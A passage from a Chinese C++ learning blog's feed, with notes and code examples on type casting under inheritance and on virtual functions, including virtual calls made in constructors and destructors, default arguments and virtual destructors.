        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前说了多态两种，一种对象多态，一种方法多态<br>不过一般都是方法多态，也就是一个类中有虚函数。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>至于对象多态表面现象也很简单，就是父类和子类之间可以相互转换。<br>可以互相转化的原理是继承的时候，类在内存之中的表达形式。</p><p>现学所知类型转换</p><ol><li>隐式类型转换</li><li>静态强制转换</li><li>动态强制转换</li></ol><p>C语言风格就是：(type)这种阔号前置的强制转换类型<br>c++风格的转换则是：static_cast&lt;type&gt;() 这样<br>至于隐式转换，整型从小转大，浮点数也是从小到大，整型和浮点型运算，要转换成浮点型。</p><p><strong>一切的前提是不加阔号进行人为干预</strong></p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">father *fa;</span><br><span class="line">son s1;</span><br><span class="line">fa = &amp;s1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单从类型上是对不上的，但是它发生了隐转，并且是类的向上转型。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">son *s1 = fa;</span><br></pre></td></tr></table></figure><p>而此类操作，属于向下转型，本身指针指向没啥问题，但是这个fa现在是指向了son类型的对象，如果被修改了，那肯定不符合son类型指针指向的问题，所以此处的隐转有风险。<br>解决的方式就像强制类型转换。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">son *s1 = (son*)fa;</span><br></pre></td></tr></table></figure><p>强制转换是人为设定的，编译器就有可能采取人为的意见去使用它。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">son *s2 = <span class="built_in">static_cast</span>&lt;son *&gt;(fa);</span><br></pre></td></tr></table></figure><p>静态转换，是c++风格的强制转换。</p><p>它与c语言的转换是有分别的。<br>静态转换的条件</p><ol><li>基类必须是可访问的</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当没有指定public继承</p><img src="/2022/07/03/Polymorphic2/000.png" class=""><p>静态转换就不可用了，而我们的强制转换还是可以用的。</p><ol start="2"><li>虚基类</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> <span class="keyword">virtual</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/03/Polymorphic2/001.png" class=""><p>进行向下转换的话，如果是虚基类，不管是静态转换还是强制转换都无法完成。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wolf</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">werewolf</span> :<span class="keyword">public</span> pople, <span class="keyword">public</span> wolf&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/03/Polymorphic2/002.png" class=""><p>在隐转的时候，发现三个地址居然有不同。</p><img src="/2022/07/03/Polymorphic2/003.png" class=""><p>看到前两个的时候，都是直接取出地址传给eax然后放到指针上，而最后一个则多了很多汇编代码。姑且就是说在最后一个赋值操作的时候，他变成了类型转换的操作。</p><p>隐式的转换会存在问题，那么再从void*上强转指针地址又会如何</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">werewolf wf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *pt = &amp;wf;</span><br><span class="line">pople *pp = (pople*)pt;</span><br><span class="line">wolf *wl = (wolf*)pt;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; pt &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; pp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; wl;</span><br></pre></td></tr></table></figure><img src="/2022/07/03/Polymorphic2/004.png" class=""><p>看到现在地址一样了。</p><img src="/2022/07/03/Polymorphic2/005.png" class=""><p>强制转换的时候，他没有别的操作了，就单纯的把pt的地址传给pp和wl指针。毕竟pt是void类型，强转也没有造成太大影响，基本上就是传递了内存的值。</p><p>但是强转如果发生在wf上。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">werewolf wf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *pt = &amp;wf;</span><br><span class="line">pople *pp = (pople*)&amp;wf;</span><br><span class="line">wolf *wl = (wolf*)&amp;wf;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; pt &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; pp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; wl;</span><br></pre></td></tr></table></figure><img src="/2022/07/03/Polymorphic2/006.png" class=""><p>发现地址又不一样了。</p><p>然后感觉视频讲的也不明不白的，自己调了一下构造pople和wolf的顺序，顺便改了继承顺序</p><img src="/2022/07/03/Polymorphic2/007.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">werewolf wf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *pt = &amp;wf;</span><br><span class="line">pople *pp = (pople*)&amp;wf;</span><br><span class="line">wolf *wl = (wolf*)&amp;wf;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; pt &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; pp &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; wl;</span><br></pre></td></tr></table></figure><p>发现修改顺序之后，werewolf第一个继承的类构造的时候地址会和void*pt是一样的，后面那个就进行一些奇怪的操作。</p><p>这让我想起来一个问题<br><strong>就是空类，实例化之后，他是会占用一个字节的内存的，我不知道这里是不是编译器觉得太多用了一个地址是奇葩操作才给后面那个提升了</strong></p><p>暂时留有疑问！</p><hr><p>实际上我们这段代码也发生了多重继承，只不过都是空的没啥意义，能够操作的也只有向上转型和向下转型，而且还会碰到不少问题。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>??!</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多态+虚函数的问题</title>
      <link href="/2022/07/02/Polymorphic1/"/>
      <url>/2022/07/02/Polymorphic1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自虚函数之后，多态会带来一些小问题</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father move\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son move\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们实例化son，并且调用test的时候，这个test当然是继承过来的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">s1.<span class="built_in">test</span>();</span><br></pre></td></tr></table></figure><p>第一感觉可能会以为输出father的move。<br>但是，这个test是被继承过来的，son类中也有一个move函数，这个move是通过虚函数继承的，也就是说move只要在这个派生类中重写了，那么就不会跟基类的move冲突。</p><img src="/2022/07/02/Polymorphic1/000.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father move\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son move\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>为了好的了解，分别在构造函数的时候打印this指针。</p><img src="/2022/07/02/Polymorphic1/001.png" class=""><p>可以看到打印的this指针的地址是相同的。</p><img src="/2022/07/02/Polymorphic1/002.png" class=""><p>随便画个草图，基类的属性通过继承就像拷贝到派生类中一样，当实例化这个派生类的时候，由于发生了继承，基类要先完成构造，然后把这个x和y传给son。<br>然后还是实例化，这里实例化的是谁，son，那么this指针就是从son的地址开始的，所以两次this都是一样的。</p><p><strong>注意派生类不会继承基类的构造函数，但是派生类在类中是可以访问的</strong></p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father move\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;<span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">this</span>-&gt;<span class="built_in">Move</span>();<span class="comment">//基类构造函数中也调用一次move</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son move\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们在基类的构造函数中也调用一次move函数。<br>然后实例化son执行test。又会发生不同的情况。</p><img src="/2022/07/02/Polymorphic1/003.png" class=""><p>可以看到，他居然执行了基类的move函数。</p><p>原因也在构造函数上，继承的时候，基类先完成初始化，所以在基类的构造函数里面调用move，它只能找到自己成员中的move函数。而后面test调用的move是因为派生类完成构造了，它里面重写了虚函数，这样就可以指定成自己的move函数了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son move\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">son::<span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/02/Polymorphic1/004.png" class=""><p>作用域指定调用肯定是调用自己，且不说派生类已经完成构造了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son move\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">father::<span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/02/Polymorphic1/005.png" class=""><p>因为虚函数被重写了，所以即便是通过基类调用test还是调用派生类重写的move。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//void Move() override&#123;</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;son move\n&quot;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">father::<span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当注释掉son类中的move，自然没有重写的部分，就只能继承基类的move函数。</p><img src="/2022/07/02/Polymorphic1/006.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father move\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;<span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">this</span>-&gt;<span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">father</span>()&#123;</span><br><span class="line"><span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son move\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="keyword">this</span> &lt;&lt; std::endl;</span><br><span class="line">father::<span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">son</span>()&#123;</span><br><span class="line"><span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当增加了析构函数之后，再依次执行move函数。<br>顺序其实也很好猜，从son实例化，基类先完成构造，派生类在完成构造，派生类先完成释放，基类在完成释放。<br>所以说，father析构函数调用的move是基类中的move，而son的析构函数则还是调用自己的。</p><img src="/2022/07/02/Polymorphic1/007.png" class=""><p>并且析构函数是类结束生命周期的象征，所以基本上都是属于静态绑定了，即便是this指针也还是自己。</p><p>如果真的要调用基类的虚函数，就直接通过作用域访问就像了</p><img src="/2022/07/02/Polymorphic1/008.png" class=""><hr><h2 id="虚函数默认参数"><a href="#虚函数默认参数" class="headerlink" title="虚函数默认参数"></a>虚函数默认参数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">AutoMove</span><span class="params">(<span class="type">int</span> step = <span class="number">2</span>)</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;auto move&quot;</span> &lt;&lt; step &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>往father类中添加个带默认参数的虚函数，然后在类中重写。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AutoMove</span><span class="params">(<span class="type">int</span> step = <span class="number">3</span>)</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;--auto move&quot;</span> &lt;&lt; step &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/02/Polymorphic1/009.png" class=""><p>看到automove的step是2，却不是3，我们指针指向son的对象了。</p><p><strong>虚函数的默认参数，即使函数被重写了，也不会改变这个默认参数</strong></p><hr><h2 id="析构问题"><a href="#析构问题" class="headerlink" title="析构问题"></a>析构问题</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">son s1;</span><br><span class="line">father *p = <span class="keyword">new</span> <span class="built_in">son</span>();</span><br><span class="line">p-&gt;<span class="built_in">AutoMove</span>();</span><br><span class="line"><span class="keyword">delete</span> p;</span><br></pre></td></tr></table></figure><img src="/2022/07/02/Polymorphic1/010.png" class=""><p>看到他先执行的father的析构函数，但是我们这个指针是指向son类的。</p><p>这是因为指针是father类型的，delete p就相当于调用了p的析构函数，所以调用的是father的析构函数。<br>当然这会造成一个内存泄漏的问题，son类作为派生类，谁能保证成员是不是多一点，至少会比基类大点，而释放的大小是参考father的。</p><p>所以虚函数又派上了用场。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;~father\n&quot;</span>;</span><br><span class="line"><span class="built_in">Move</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/02/Polymorphic1/011.png" class=""><p>看到将析构函数也设置成虚析构函数之后，son类型的析构函数也会继承，这样一来释放的时候就会参考new的类型。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>虚继承这种动态的绑定关系真的要好好理一理。。<br>至于虚析构函数，如果没有特定内容，我们也可以用default指定。<code>virtual ~father() = default;</code></p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚函数</title>
      <link href="/2022/07/02/virtualFunction/"/>
      <url>/2022/07/02/virtualFunction/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>关键字</p><ul><li>virtual</li></ul><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MoveObject</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">x++;</span><br><span class="line">y++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NPCObject</span> :<span class="keyword">public</span> MoveObject&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">x++;</span><br><span class="line">y++;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;NPCobject!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MonsterObject</span> :<span class="keyword">public</span> MoveObject&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">x++;</span><br><span class="line">y++;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;monsterobject!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span 